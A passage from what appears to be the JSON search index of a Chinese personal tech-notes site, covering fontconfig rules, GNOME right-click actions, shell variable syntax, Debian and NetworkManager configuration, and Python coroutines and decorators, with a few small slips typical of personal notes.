<dir>~/.fonts</dir> 当我们安装字体软件包时，软件包把字体文件放在了/usr/share/fonts/目录下 配置自己的规则 比如我已经提前安装好了 inconsolata 字体, 然后在家目录下设置了配置文件, 新建文件 ~/.config/fontconfig/fonts.conf : <?xml version=\"1.0\"?> <!DOCTYPE fontconfig SYSTEM \"/etc/fonts/conf.d/fonts.dtd\"> <fontconfig> <match target=\"pattern\"> <test qual=\"any\" name=\"family\"> <string>monospace</string> </test> <edit name=\"family\" mode=\"prepend\" binding=\"strong\"> <string>inconsolata</string> <string>Iosevka Custom</string> <string>Noto Sans Mono CJK SC</string> <string>Blobmoji</string> <string>Symbols Nerd Font</string> </edit> </match> </fontconfig> 这个时候查询等宽字体的结果就是我设置的这个: $ fc-match \"monospace\" Inconsolata.otf: \"Inconsolata\" \"Medium\" 解释一下这里配置含义 fontconfig 表示是一个字体查询配置 match 匹配规则, <match target=\"pattern\"> ，被操作对象是 font pattern; 如果是 <match target=\"font\"> , 则是对单个字体的操作 test 定义匹配规则, 可选的测试条件。只有当满足测试条件的时候，才执行<edit>; 这里表示匹配 monospace 家族 edit 表示匹配的字体结果 此处完整含义: 在这里，test 语句针对了 font pattern 中的 monospace。 也就是说， 接下来的 edit 语句就在 font pattern 的 monospace 这个位置上进行操作。 mode=\"prepend\"的意思是在 monospace 前添加四个字体： 等宽字体 inconsolata， 英文等宽字体 Iosevka Custom， 中文字体 Noto Sans Mono CJK SC， 以及通用字体族名 emoji。 binding=\"strong\"，是强绑定的意思， 它会影响 font pattern 的排序结果， name=\"family\" 表明被操作对象是是 font pattern 中的 family。 mode=\"prepend\" 表示在结果之前插入; 如果是 mode=\"assign\" , 表示对test中的String修改替换. 如向 fc-match 传入的 font pattern 是可以有多个字体的。 现在我们要运行: FC_DEBUG=4 fc-match 'cantarell, WenQuanYi Micro Hei' 经过这段配置会变成什么呢: <match target=\"pattern\"> <test name=\"family\"> <string>Cantarell</string> </test> <edit name=\"family\" mode=\"assign\" binding=\"strong\"> <string>Noto Sans</string> </edit> </match> 这里的mode=\"assign\"，表示 将 font pattern 中的 Cantarell 修改成 Noto Sans。 没有对 WenQuanYi Micro Hei 的操作，所以结果是: family: \"Noto Sans\"(s) \"WenQuanYi Micro Hei\"(s) binding=\"strong\" 表示强绑定 下面的 String 的内容的是结果列表, 支持多个 先后顺序就是设置的优先使用的字体顺序。 最先尝试使用 inconsolata 字体作为英文等宽字体, 然后才是 Iosevka ， 中日韩字体使用 Noto Sans Mono CJK SC ， 剩下的 emoji 和特殊符号 优先使用 Blobmoji 和 Nerd font 。 完整属性说明可参考: https://www.cnblogs.com/jacker1979/p/4695169.html 注解 旧版是使用的alias: <match>...<test>...<edit name=\"family\" mode=\"prepend\">... 等价于 <alias>...<family>...<prefer>...","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-Tutorial-Debian-Ubuntu-font-description.html","loc":"/yq-doc-source-docs-operating-system-linux-Tutorial-Debian-Ubuntu-font-description.html"},{"title":"GNOME文件管理器内添加右键菜单","text":"目前已测试适用与 Ubuntu20 nautilus nautilus 是 GNOME 自带的文件管理器, 可以理解为Win的文件管理器 使用系统自带的 .local/share/nautilus/scripts 只能在右键单击文件时候弹出所添加的脚本 目前经过多方搜索, 暂时只确定了使用额外的包 nautilus-actions 辅助解决, 新版本是 filemanager-actions . 其实核心都是一样的, 就是 nautilus 在 新版更名为 filemanager . 旧版本安装: apt install nautilus-actions 新版本安装: apt install filemanager-actions 安装后带开图形界面进行右键菜单的编辑, 选择新建菜单/新建动作即可, 注意默认是有一个 filemanager 的根菜单, 如果不想要, 在 编辑-首选项-运行时首选项-Nautils菜单布局 下取消勾选即可. 新版 filemanager 的配置文件在 ~/.config/filemanager-actions 下面, 而自定义的配置的文件位置在 ~/.local/share/nautilus/file-manager/actions 下. ~/.local/share/nautilus/file-manager/actions 下还是 .desktop 文件, 例: [Desktop Entry] Type=Action Name=菜单项名称 Icon=/path/to/your/icon.png Exec=/path/to/your/command \"%F\" Name[en_US]=菜单项名称 [Desktop Action 菜单项名称] Name=子菜单项名称 Exec=/path/to/your/command \"%F\" Icon=/path/to/your/icon.png","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-Tutorial-Right--click-menu-to-the-gnome-file-manager.html","loc":"/yq-doc-source-docs-operating-system-linux-Tutorial-Right--click-menu-to-the-gnome-file-manager.html"},{"title":"Linux各种$(美元符)","text":"$$ Shell本身的PID（ProcessID，即脚本运行的当前 进程ID号） $! Shell最后运行的后台Process的PID(后台运行的最后一个进程的 进程ID号) $? 最后运行的命令的结束代码（返回值）即执行上一个指令的返回值 (即显示最后命令的退出状态。0表示没有错误，其他任何值表明有错误) $- 显示shell使用的当前选项，与set命令功能相同 $* 所有参数列表。如 \"$*\" 用「\"」括起来的情况, 表示以 $1 $2 … $n 的形式输出所有参数，此选项参数可超过9个。 $@ 所有参数列表。如 \"$@\" 用「\"」括起来的情况, 表示以 \"$1\" \"$2\" … \"$n\" 的形式输出所有参数。 $@ 跟 $* 类似，但是可以当作数组用 $# 添加到Shell的参数个数 $0 Shell本身的文件名 $1~$n 添加到Shell的各参数值. $1 是第1参数, $2 是第2参数…。 !$ 最后执行的语句以及结果","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-Tutorial-shell-grammar-specification-Linux-various-$.html","loc":"/yq-doc-source-docs-operating-system-linux-Tutorial-shell-grammar-specification-Linux-various-$.html"},{"title":"逻辑与","text":"即 && , 主要说一下与 & 一起使用的情况 如: cmd1 && cmd2 && cmd3 & 默认表示 cmd1 && cmd2 && cmd3 都在后台执行","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-Tutorial-shell-grammar-specification-Logic-and.html","loc":"/yq-doc-source-docs-operating-system-linux-Tutorial-shell-grammar-specification-Logic-and.html"},{"title":"shell的变量替换","text":"几种特殊的替换结构 四种: ${var:-string} ${var:+string} ${var:=string} ${var:?string} ${var:-string} 和 ${var:=string} : 若变量var为空，则用在命令行中用string来替换${var:-string}， 否则变量var不为空时，则用变量var的值来替换${var:-string}； 对于${var:=string}的替换规则和${var:-string}是一样的， 所不同之处是${var:=string}若var为空时，用string替换${var:=string}的同时，把string赋给变量var; ${var:=string}很常用的一种用法是，判断某个变量是否赋值，没有的话则给它赋上一个默认值 ${var:+string} 替换规则和上面的相反，即只有当var不是空的时候才替换成string， 若var为空时则不替换或者说是替换成变量 var的值， 即空值。(因为变量var此时为空，所以这两种说法是等价的) ${var:?string} 若变量var不为空，则用变量var的值来替换${var:?string}； 若变量var为空，则把string输出到标准错误中，并从脚本中退出。 我们可利用此特性来检查是否设置了变量的值。 注解 上面这四种替换结构中string不一定是常值的，可用另外一个变量的值或是一种命令的输出。 四种模式匹配替换结构 模式匹配记忆方法： # 是去掉左边(在键盘上#在$之左边) % 是去掉右边(在键盘上%在$之右边) # 和 % 中的单一符号是最小匹配，两个相同符号是最大匹配。 也是四种: ${var%pattern} ${var%%pattern} ${var#pattern} ${var##pattern} 第一种模式: ${variable%pattern} shell在variable中查找，看它是否一给的模式pattern结尾， 如果是，就从命令行把variable中的内容去掉右边最短的匹配模式 第二种模式: ${variable%%pattern} shell在variable中查找，看它是否一给的模式pattern结尾， 如果是，就从命令行把variable中的内容去掉右边最长的匹配模式 第三种模式: ${variable#pattern} shell在variable中查找，看它是否一给的模式pattern开始， 如果是，就从命令行把variable中的内容去掉左边最短的匹配模式 第四种模式: ${variable##pattern} shell在variable中查找，看它是否一给的模式pattern结尾， 如果是，就从命令行把variable中的内容去掉右边最长的匹配模式 注解 这四种模式中都不会改变variable的值， 其中, 只有在pattern中使用了 ``*`` 匹配符号时 , %和%%，#和##才有区别. 结构中的pattern支持通配符, * 表示零个或多个任意字符; ? 表示仅与一个任意字符匹配; [...] 表示匹配中括号里面的字符; [!...] 表示不匹配中括号里面的字符. 示例: var=testcase echo $var #testcase 去掉右边的se: echo ${var%s*e} #testca echo $var #testcase 去掉s..e: echo ${var%%s*e} #te 去掉左边第一个e之前的（包括自己）: echo ${var#?e} #stcase 去掉se: echo ${var##?e} #stcase 去自己: echo ${var##*e} # 去的就剩个e: echo ${var##*s} #e 去test: echo ${var##test} #case","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-Tutorial-shell-grammar-specification-SHELL-variable-replacement.html","loc":"/yq-doc-source-docs-operating-system-linux-Tutorial-shell-grammar-specification-SHELL-variable-replacement.html"},{"title":"shell下while与set","text":"使用了: set -e 时, 一定要注意不能包裹 while 语句. while语句的最后一次结果, 会返回1, 退出while循环, 然后set -e就会觉得是代码报错了, 不给后续代码执行 例: set -e blue_echo(){ local _strs _strs=\"$*\" echo \"\\e[1;36m${_strs}\\e[0m\\n\" } pv_blue_echo(){ local _time _time=\"$1\" set +e while [ ${_time} -gt 0 ]; do blue_echo \"................\" | pv -qL 15 _time=\"$(expr \"${_time}\" - 1)\" done set -e } # pv_blue_echo 3","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-Tutorial-shell-grammar-specification-Under-shell-and-set.html","loc":"/yq-doc-source-docs-operating-system-linux-Tutorial-shell-grammar-specification-Under-shell-and-set.html"},{"title":"shell退出状态码","text":"Linux退出状态码 状态码 描述 0 命令成功结束 1 通用未知错误 2 误用shell命令 126 命令不可执行 127 没找到命令 128 无效退出参数 128+x Linux信号x的严重错误 130 命令通过Ctrl+C终止 255 退出状态码越界 返回值 只能返回整数值: #!/bin/bash function getResultFun(){ echo \"这是我的第一个 shell 函数!\" return `expr 1 + 1` } getResultFun echo $?","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-Tutorial-shell-grammar-specification-shell-exit-status-code.html","loc":"/yq-doc-source-docs-operating-system-linux-Tutorial-shell-grammar-specification-shell-exit-status-code.html"},{"title":"debian查看版本","text":"在 Debian 或基于 Debian 的 Linux 发行版中，有多种方法可以查看当前系统的版本信息： 使用 lsb_release 命令: lsb_release -a 这个命令可以显示当前系统的发行版名称、版本号、Codename 和描述信息。 查看 /etc/issue 文件: cat /etc/issue 这个文件包含了当前系统的版本和发行版信息。 查看 /etc/os-release 文件: cat /etc/os-release 这个文件包含了当前系统的发行版名称、版本号、ID 和描述信息。 使用 uname 命令: uname -a 这个命令可以显示当前系统的内核版本、主机名和操作系统类型等信息。 其中，lsb_release 命令是最常用的方法之一，可以提供比较详细的系统版本信息。如果您只需要查看基本的版本信息，可以使用其他方法。","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-debian-Debian-View-System-Version.html","loc":"/yq-doc-source-docs-operating-system-linux-debian-Debian-View-System-Version.html"},{"title":"Debian包依赖","text":"要知道package的依赖方案 可以直接看报错地方的源码的要求 也可以直接: apt-cache show $package 有些涉及到了系统的包没法操作的话: apt-get install aptitude aptitude insatll $package #这里会给出依赖方案，选一个可行的 apt-get insatll $package","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-debian-Debian-package-dependencies.html","loc":"/yq-doc-source-docs-operating-system-linux-debian-Debian-package-dependencies.html"},{"title":"debian一些了解","text":"debian的服务基本上都可以在 /etc/init.d 下找到 使用apt安装deb本地包 deb包可以通过dpkg安装: dpkg -i <package> 也可以通过apt安装: apt install ./<package> 注解 apt 安装本地deb包时, 必须指定路径, 否则会去软件仓库找.","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-debian-debian-some-understanding.html","loc":"/yq-doc-source-docs-operating-system-linux-debian-debian-some-understanding.html"},{"title":"网络管理","text":"几个相关的配置文件 /etc/resolv.conf DNS配置相关的文件, 内容就是当前正在使用的DNS, 如: # # macOS Notice # # This file is not consulted for DNS hostname resolution, address # resolution, or the DNS query routing mechanism used by most # processes on this system. # # To view the DNS configuration used by this system, use: # scutil --dns # # SEE ALSO # dns-sd(1), scutil(8) # # This file is automatically generated. # nameserver 192.168.1.1 nameserver 192.168.1.1 # 表示注释, nameserver表示使用的DNS服务器. 我这里是连的WIFI, 所以使用路由器那边网关提供的路由 /etc/network/interfaces Unix/Linux 系统网络配置的传统文件，该文件通常用于手动配置网络接口以及 IP 地址等相关参数 高版本如Ubuntu 20.04 中，所有的网络设置都已经转移到了 NetworkManager 当中，此文件不再被默认使用. 配置比NetworkManager 更复杂 NetworkManager /usr/lib/NetworkManager/conf.d/ 默认的系统级配置文件路径, 包含了一些系统级别的配置文件， 它们是由软件包提供方安装的，这些文件通常不应该被用户轻易修改。 如果您确实需要修改其中的某些配置选项，可以使用 /etc/NetworkManager/conf.d/ 目录下的本地配置文件进行覆盖。 ~/.config/NetworkManager/ 默认的用户级配置文件路径, 包含当前用户特定的NetworkManager配置文件. /etc/NetworkManager/NetworkManager.conf NetworkManager 的主要配置文件，它包含了系统级别的默认配置选项。 在该文件中可以配置很多选项，例如要使用哪种插件来管理网络接口、是否启用 DNS 重写等等。 如其中的 [ifupdown] 下配置 managed=true 表示自启动 /etc/NetworkManager/conf.d/ 目录, 此文件夹下可能有一些配置文件. 包含了一些本地的配置文件， 它们会覆盖掉 /usr/lib/NetworkManager/conf.d/ 中一些系统级别的配置文件。 如果您需要修改 NetworkManager 的某些配置选项，最好在该目录下创建一个新的配置文件，并将修改后的内容写入到该文件中。 /etc/NetworkManager/system-connections/ 包含了所有存储在系统中的网络连接的详细信息。 每个网络连接都有一个对应的 .nmconnection 文件，其中包含了该连接的所有参数。 如果需要手动修改某个网络连接的参数（例如 IP 地址或者 DNS 服务器），可以编辑该文件并修改对应的值。 在公司Ubuntu20的云桌面上找了很久的 Wired connection 在哪配置自动链接ipv4, 最终发现除了图形界面的设置, 还写到了 /etc/NetworkManager/system-connections/Wired connection 1.nmconnection 而此网卡 ens18 的ip, dns在 /etc/NetworkManager/system-connections/ens18.nmconnection 注解 有一个 /docs/操作系统/linux/linux指令/nmcli 指令支持 图形界面的网络配置工具 Debian 系统 NM 的官方文档位于 \" /usr/share/doc/network-manager/README.Debian \" 。 本质上，如下操作即可完成桌面的网络配置。 通过下列命令使桌面用户 foo 归属 \" netdev \" 组, 另外，例如 GNOME 和 KDE 这样的现代桌面环境会通过 D-bus <https://zh.wikipedia.org/wiki/D-Bus> 自动完成该操作: $ sudo adduser foo netdev 使 \" /etc/network/interfaces \" 的配置保持 下面那样简洁: auto lo iface lo inet loopback 通过下列命令重新 启动 NM: $ sudo systemctl restart network-manager 通过图形界面配置网络。 注解 只有 不 列在 \" /etc/network/interfaces \" 中的接口会被 NM 管理，以避免与 ifupdown 的冲突。 如果你想扩展 NM 的网络配置功能，请寻找适当的插件模块和补充软件包， 例如 network-manager-openconnect 、 network-manager-openvpn-gnome 、s s network-manager-pptp-gnome 、 mobile-broadband-provider-info 、 gnome-bluetooth 等等。","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-network-Network-management.html","loc":"/yq-doc-source-docs-operating-system-linux-network-Network-management.html"},{"title":"Linux图形界面","text":"此篇主要针对与Ubuntu20 仅以此篇, 纪念那云桌面重启后的丢失的图形界面 Ubuntu的桌面系统分: 桌面环境 显示器管理器 桌面环境 常见的有 GNOME KDE Xfce 显示器管理器 显示管理器向用户显示登录屏幕。 当用户成功输入用户名和密码的有效组合时，会话开始。gdm3，kdm 和 lightdm 都是显示管理器。 它们提供图形化登录并处理用户身份验证。 gdm，gnome系列的图形管理器。 kdm, SDDM是KDE系列的图形管理器。 lightdm是另一种跨桌面DM。该显示管理器的主要功能是重量轻，这意味着它在占用很少内存的情况下提供了出色的性能。 查看当前使用的显示器管理器: cat /etc/X11/default-display-manager 可能的值: /usr/sbin/gdm3 或 /usr/sbin/lightdm 或 /usr/sbin/sddm 注解 可直接执行: sudo gdm 或 sudo startx 进入图形界面. 切换显示器管理器: sudo dpkg-reconfigure <Default_Display_Manager> 如: sudo dpkg-reconfigure gdm3 或 sudo dpkg-reconfigure lightdm 或 sudo dpkg-reconfigure sddm","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-ubuntu-graphic-interface.html","loc":"/yq-doc-source-docs-operating-system-linux-ubuntu-graphic-interface.html"},{"title":"getattr","text":"返回一个对象属性值 getattr 语法: getattr(object, name[, default])","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-Built--in-function-Getattr.html","loc":"/yq-doc-source-docs-rear-end-python-Built--in-function-Getattr.html"},{"title":"isinstance","text":"是否是字典: isinstance(str, dict)","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-Built--in-function-Isinstance.html","loc":"/yq-doc-source-docs-rear-end-python-Built--in-function-Isinstance.html"},{"title":"locals","text":"locals() 函数会以字典类型返回当前位置的全部局部变量。 对于函数, 方法, lambda 函式, 类, 以及实现了 __call__ 方法的类实例, 它都返回 True: >>>def runoob(arg): # 两个局部变量：arg、z ... z = 1 ... print (locals()) ... >>> runoob(4) {'z': 1, 'arg': 4} # 返回一个名字/值对的字典 >>>","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-Built--in-function-Locals.html","loc":"/yq-doc-source-docs-rear-end-python-Built--in-function-Locals.html"},{"title":"__import__","text":"用于动态加载类和函数 参数 __import__(name, globals=None, locals=None, fromlist=(), level=0) name: str 导入的模块名, 当 fromlist 为空时, 返回的是顶层模块 globals: None/globals()/locals() 模块作用范围, 全局变量或局部变量. 默认None, 一般不用设置 fromlist: list 导入子模块的集合. level: int 0表示绝对导入, 为正使用相对导入, 相对于调用__import __()的模块目录","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-Built--in-function-__import__.html","loc":"/yq-doc-source-docs-rear-end-python-Built--in-function-__import__.html"},{"title":"__init__","text":"属于 /docs/后端/python/概念相关/object类 用于类中，一般表示初始化类（构造函数） 顺便提一下 __init__.py 在Python工程里，当python检测到一个目录下存在 __init__.py 文件时， python就会把它当成一个模块(module)。 Module跟C＋＋的命名空间和Java的Package的概念很像，都是为了科学地组织化工程，管理命名空间。 __init__.py 可以是一个空文件，也可以有非常丰富的内容。 __init__.py 的原始使命是声明一个模块，所以它可以是一个空文件。 在 __init__.py 中声明的所有类型和变量，就是其代表的模块的类型和变量 我们在利用`__init__.py`时，应该遵循如下几个原则： 不要污染现有的命名空间。 模块一个目的，是为了避免命名冲突，如果你在种用 __init__.py 时违背这个原则， 是反其道而为之，就没有必要使用模块了。 利用 __init__.py 对外提供类型、变量和接口，对用户隐藏各个子模块的实现。 一个模块的实现可能非常复杂，你需要用很多个文件，甚至很多子模块来实现， 但用户可能只需要知道一个类型和接口。由于各个子模块的实现有可能非常复杂， 而对外提供的类型和接口有可能非常的简单，我们就可以通过这个方式来对用户隐藏实现，同时提供非常方便的使用。 只在 __init__.py 中导入有必要的内容，不要做没必要的运算。 如果我们在 __init__.py 中做太多事情，每次import都会有额外的运算，会造成没有必要的开销。 和 __main__.py 区别 当在文件夹下时 __init__.py 表示是一个模块(把当前文件所在文件夹视为一个模块，相当于把此文件夹的上一层加入path) __main__.py 表示文件所在文件夹可以直接执行（把当前文件所在路径加入到sys.path） 举个例子, 把他们都放到 test 文件夹下 执行 pyton test 只会执行 __main__.py 执行 python -m test 会先执行 __init__.py ， 再执行 __main__.py","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-Built--in-function-__init__.html","loc":"/yq-doc-source-docs-rear-end-python-Built--in-function-__init__.html"},{"title":"协程","text":"常用的异步库见: /docs/后端/python/python标准库/asyncio 基于python特性, 于是有了单线程内多任务, 即协程, 是一种轻量级线程 (另一方面, 避免了线程在内核的切换, 而是用户态类似函数的快捷切换) 这里主要适用于 python3.5 以上的版本(asyncio是3.5以后才引入的) 定义一个异步函数: async def say_hello(): print(aa := 'hello') return aa 同步函数中使用 run_until_complete 同步获取结果: import asyncio def test_a(): loop = asyncio.get_event_loop() # 使用 run_until_complete 同步获取结果 res = loop.run_until_complete(say_hello()) print(f'end {res}',) 在协程函数中使用await也可以获取结果，但是最终还是需要一个look来进行获取结果: async def some_a_a(): res = await say_hello() # 多个协程并发执行 # 方法1：使用 asyncio.gather res1, res2 = await asyncio.gather(say_hello(), say_hello()) # 方法2：使用 asyncio.ensure_future 创建 task，或者使用 asyncio.create_task(), 暂时还不确定区别，不过前者在某些情况下会触发后者， # 还可以调用future对象 # 此时进入 pending 状态， 可以通过 task.done() -> done 获取是否执行 task1, task2 = asyncio.ensure_future(say_hello()), asyncio.ensure_future(say_hello()) # await task1, task2 # res11, res22 = task1.result(), task2.result() res11, res22 = await task1, await task2 print(res, res1, res2, res11, 'res11', res22) return 1 同步函数中直接通过 run调用获取结果: def test_run(): # 直接通过 run调用获取结果， 将 some_a_a 转换为一个task aa = asyncio.run(some_a_a()) print(aa) asyncio.wait 和 asyncio.gather 详情可参考: /docs/后端/python/python标准库/asyncio await asyncio.wait(task_list) await asyncio.gather(*task_list) 相同 从功能上看，asyncio.wait 和 asyncio.gather 实现的效果是相同的，都是把所有 Task 任务结果收集起来。 不同 asyncio.wait 会返回两个值： done 和 pending， done 为已完成的协程 Task，pending 为超时未完成的协程 Task， 需通过 future.result 调用 Task 的 result； 而asyncio.gather 返回的是所有已完成 Task 的 result， 不需要再进行调用或其他操作，就可以得到全部结果。 asyncio 中await和create_task的区别 参考: https://blog.csdn.net/luchengtao11/article/details/124527729 await的理解 立即开始执行协程对象，并允许它被挂起。--如果没有可被挂起的逻辑，则不会让出执行权 与 task的不同之处 create_task，是在loop里执行的，所以在loop调度该task之前，其他的task还是有机会运行的。 await使用的当前的context，而create_task会拷贝一份context 总结就是：create_task的消耗会更高一些。await执行过程中如果没有可以被挂起的地方，则其他任务就永远不会被执行。 简而言之, 在任务调度执行中, 由于无法在同步任务中再使用时间循环获取结果, 所以只有定义为异步方法使用await, 或者在同步任务中创建一个任务, 并给他足够时间以得到执行, 创建任务会放到事件循环中, 等待异步自动调度执行. 多线程的事件循环 一般而言, 只能是主线程拥有自己的事件循环, 子线程无法获取主线程的loop, 若子线程需要, 可以在新建一个loop给子线程使用, 尤其是gui编程的时候, gui线程只能在主线程跑, 那么当存在全局的非gui能处理的实时监听时, 那么就只能在子线程跑了(或者新建一个进程, 至少目前我是没有其他办法)","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-Concept-Coroutine.html","loc":"/yq-doc-source-docs-rear-end-python-Concept-Coroutine.html"},{"title":"装饰器","text":"装饰器只会在函数定义时被调用一次。有时候你去掉装饰器的功能，那么你只需要简单的返回被装饰函数即可。 函数装饰器 普通装饰器: # 异步放到线程池执行 def async_run_in_thread_pool(fn): # 刷新 __name__ @functools.wraps(fn) async def wrapper(*args, **kwargs): def _exec_fn(params): # 这样写是为了兼容， run_in_executor 的参数只有 *args _arg = params[0] _kwarg = params[1] return fn(*_arg, **_kwarg) loop = asyncio.get_running_loop() executor = ThreadPoolExecutor() return await loop.run_in_executor(executor, _exec_fn, (args, kwargs,)) return wrapper 带参数的装饰器, 就是在装饰器外部再套一层带参装饰器: def async_run_in_thread_pool_with_params(*args, **kwargs): print(args, kwargs) return async_run_in_thread_pool 使用: @async_run_in_thread_pool_with_params(33, a=1, b=2) def add(a, b): return a + b # 输出会增加 # (33,) {'a': 1, 'b': 2} 装饰器类 自定义 __call__ 函数 用类也可以实现一个装饰器。 类能实现装饰器的功能， 是由于当我们调用一个对象时，实际上调用的是它的 __call__ 方法: class Demo: def __call__(self): print('我是 Demo') demo = Demo() demo() 输出: 我是 Demo 通过这个特性，我们便可以用类的方式来完成装饰器，功能与刚开始用函数实现的一致: class Decorator: def __init__(self, func): self.func = func def __call__(self, *args, **kwargs): print('123') return self.func(*args, **kwargs) @Decorator def say_hello(): print('同学你好') say_hello() 输出: 123 同学你好 不带参数装饰器类 注意, 使用的时候是, @装饰器类(), 也就是说使用的是对象的实例, 与被装饰的函数是一一绑定(只要没有单例): # 不带参数装饰器类 # 这里有一个问题， 无法使用 @functools.wraps 来刷新 class RunInThreadPool(object): _thread_pool: ThreadPoolExecutor = None @classmethod def _create_thread_pool(cls): if not cls._thread_pool: cls._thread_pool = ThreadPoolExecutor() def __init__(self, fun): self._fun = fun self._create_thread_pool() def __call__(self, *args, **kwargs): _future = self._thread_pool.submit(self._fun, *args, **kwargs) # 会阻塞 return _future.result() 带参数装饰器类 无法使用 @functools.wraps 来刷新: # 不带参数装饰器类 # 这里有一个问题， 无法使用 @functools.wraps 来刷新 class RunInThreadPool(object): _thread_pool: ThreadPoolExecutor = None @classmethod def _create_thread_pool(cls): if not cls._thread_pool: cls._thread_pool = ThreadPoolExecutor() def __init__(self, fun): self._fun = fun self._create_thread_pool() def __call__(self, *args, **kwargs): _future = self._thread_pool.submit(self._fun, *args, **kwargs) # 会阻塞 return _future.result() 一些官方装饰器 wraps装饰器, 一个函数不止有他的执行语句，还有着 __name__`（函数名），`__doc__ （说明文档）等属性: def decorator(func): def wrapper(*args, **kwargs): \"\"\"doc of wrapper\"\"\" print('123') return func(*args, **kwargs) return wrapper @decorator def say_hello(): \"\"\"doc of say hello\"\"\" print('同学你好') print(say_hello.__name__) print(say_hello.__doc__) 输出: wrapper doc of wrapper 由于装饰器返回了 wrapper 函数替换掉了之前的 say_hello 函数，导致函数名，帮助文档变成了 wrapper 函数的了。 解决这一问题的办法是通过 /docs/后端/python/python标准库/functools 模块下的 wraps 装饰器: from functools import wraps def decorator(func): @wraps(func) def wrapper(*args, **kwargs): \"\"\"doc of wrapper\"\"\" print('123') return func(*args, **kwargs) return wrapper @decorator def say_hello(): \"\"\"doc of say hello\"\"\" print('同学你好') print(say_hello.__name__) print(say_hello.__doc__) 输出: say_hello doc of say hello 内置装饰器 有三种我们经常会用到的装饰器， property 、 staticmethod 、 classmethod ， 他们有个共同点，都是作用于类方法之上。 property 装饰器 用于类中的函数，使得我们可以像访问属性一样来获取一个函数的返回值: class XiaoMing: first_name = '明' last_name = '小' @property def full_name(self): return self.last_name + self.first_name xiaoming = XiaoMing() print(xiaoming.full_name) 输出: 小明 例子中我们像获取属性一样获取 full_name 方法的返回值，这就是用 property 装饰器的意义， 既能像属性一样获取值，又可以在获取值的时候做一些操作。 staticmethod 装饰器 用于类中的方法，这表示这个方法将会是一个静态方法， 意味着该方法可以直接被调用无需实例化，但同样意味着它没有 self 参数，也无法访问实例化后的对象: class XiaoMing: @staticmethod def say_hello(): print('同学你好') XiaoMing.say_hello() # 实例化调用也是同样的效果 # 有点多此一举 xiaoming = XiaoMing() xiaoming.say_hello() 输出: 同学你好 同学你好 classmethod 装饰器 用于类中的方法，这表示这个方法将会是一个类方法，意味着该方法可以直接被调用无需实例化， 但同样意味着它没有 self 参数，也无法访问实例化后的对象。 相对于 staticmethod 的区别在于它会接收一个指向类本身的 cls 参数: class XiaoMing: name = '小明' @classmethod def say_hello(cls): print('同学你好， 我是' + cls.name) print(cls) XiaoMing.say_hello() 输出: 同学你好， 我是小明 <class '__main__.XiaoMing'> 多个装饰器的调用顺序 例: # coding: utf-8 # # Copyright (C) 2022-2023, Inc. All Rights Reserved # # @Time : 2023/4/20 下午1:13 # @Author : yan que # @Email : yanquer@qq.com # @File : with_warp.py # @Project : mytest import logging _logger = logging.getLogger(__name__) _console_handler = logging.StreamHandler() _logger.addHandler(_console_handler) _logger.setLevel(logging.INFO) def warp1(fn): def _warp(*args, **kwargs): _logger.info(f'warp1 {fn} start') ret = fn(*args, **kwargs) _logger.info('warp1 end') return ret return _warp def warp2(fn): def _warp(*args, **kwargs): _logger.info(f'warp2 {fn} start') ret = fn(*args, **kwargs) _logger.info('warp2 end') return ret return _warp @warp1 @warp2 def main(): _logger.info('main start') print('main') _logger.info('main end') if __name__ == '__main__': main() 输出: warp1 <function warp2.<locals>._warp at 0x10755a8b0> start warp2 <function main at 0x10755a820> start main start main end warp2 end warp1 end main main的顺序不用管, 因为日志与直接打印不是一个处理流. 可以看出, 装饰器是按照使用顺序调用的, 前面的装饰器实际装饰的并非直接是函数, 而是后一个装饰器. 某些情况下需要注意调用顺序. 装饰器调用说明 此处主要说明是否带参数/括号时的不同 不带括号时的调用: # Example use @logged def add(x, y): return x + y 类似等价于: def add(x, y): return x + y add = logged(add) 这时候，被装饰函数会被当做第一个参数直接传递给 logged 装饰器。因此， logged() 中的第一个参数就是被包装函数本身。所有其他参数都必须有默认值。 带括号/参数时的调用: @logged(level=logging.CRITICAL, name='example') def spam(): print('Spam!') 等价于: def spam(): print('Spam!') spam = logged(level=logging.CRITICAL, name='example')(spam) 初始调用 logged() 函数时，被包装函数并没有传递进来。因此在装饰器内，它必 须是可选的。这个反过来会迫使其他参数必须使用关键字来指定。并且，但这些参数被 传递进来后，装饰器要返回一个接受一个函数参数并包装它的函数","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-Concept-Decorator.html","loc":"/yq-doc-source-docs-rear-end-python-Concept-Decorator.html"},{"title":"迭代(生成器/式)","text":"字典生成式, 会立刻计算: a = {id:0 for id in range(10)} 列表生成式, 会立刻计算: [x for x in iter_obj] 生成器, 不会立刻计算, 返回一个生成器: (x for x in iter_obj) 可迭代对象 序列（Sequence）: An iterable which supports efficient element access using integer indices via the **getitem**() special method and defines a **len**() method that returns the length of the sequence. Some built-in sequence types are list, str, tuple, and bytes. Note that dict also supports **getitem**() and **len**(), but is considered a mapping rather than a sequence because the lookups use arbitrary immutable keys rather than integers. The collections.abc.Sequence abstract base class defines a much richer interface that goes beyond just **getitem**() and **len**(), adding count(), index(), **contains**(), and **reversed**(). Types that implement this expanded interface can be registered explicitly using register(). 提练重点如下： 可迭代； 支持下标访问，即实现了 getitem () 方法，同时定义了 len () 方法，可通过 len() 方法获取长度； 内置的序列类型：list、str、tuple、bytes； dict 同样支持 getitem () 和 len () ，但它不归属于序列类型，它是映射类型，因为它不能根据下标查找，只能根据 key 来查找； 抽象类 collections.abc.Sequence 还提供了很多方法，比如 count()、index()、 contains () 、 reversed () 可用于扩展； 总结结论： 序列一定是一个可迭代对象，但可迭代对象不一定是序列 。 可迭代对象(Iterable) 